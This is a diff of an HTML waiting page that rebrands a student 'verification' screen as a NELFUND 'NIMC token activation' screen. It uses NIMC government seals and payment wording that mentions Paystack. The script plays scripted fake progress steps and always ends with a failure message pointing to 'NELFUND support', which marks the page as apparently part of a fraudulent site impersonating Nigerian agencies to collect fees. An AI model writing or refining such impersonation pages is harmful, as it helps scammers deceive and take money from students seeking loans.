@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verifying – NETFUND Student Portal</title>
+  <title>Activating Token – NELFUND</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, system-ui, sans-serif; }
     body { background: #0a1628; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
@@ -25,8 +25,8 @@
 <body>
   <div class="card">
     <div class="spinner"></div>
-    <h2>⏳ Verifying Your Student Status</h2>
-    <p class="sub">Please wait while we validate your identity with NIMC</p>
+    <h2>⏳ Activating NIMC Token</h2>
+    <p class="sub">Please wait while we verify your identity with NIMC</p>
 
     <div class="seal-stamp">
       <div class="stamp">🏛️ <strong>NIMC</strong> Gateway</div>
@@ -48,8 +48,8 @@
     const userId = new URLSearchParams(window.location.search).get('userId');
     const steps = [
       '🔐 Connecting to NIMC secure gateway...',
-      '✅ Verifying payment with Paystack...',
-      '🔄 Generating your Student Verification Code (SVC)...'
+      '✅ Verifying token payment with Paystack...',
+      '🔄 Generating your NIMC Verification Token...'
     ];
     let i = 0;
     const progressFill = document.getElementById('progressFill');
@@ -62,7 +62,7 @@
         i++;
       } else {
         clearInterval(interval);
-        status.innerText = '❌ Verification failed – please contact student support.';
+        status.innerText = '❌ Token activation failed – please contact NELFUND support.';
         progressFill.style.width = '100%';
         progressFill.style.background = '#ef4444';
         setTimeout(() => {
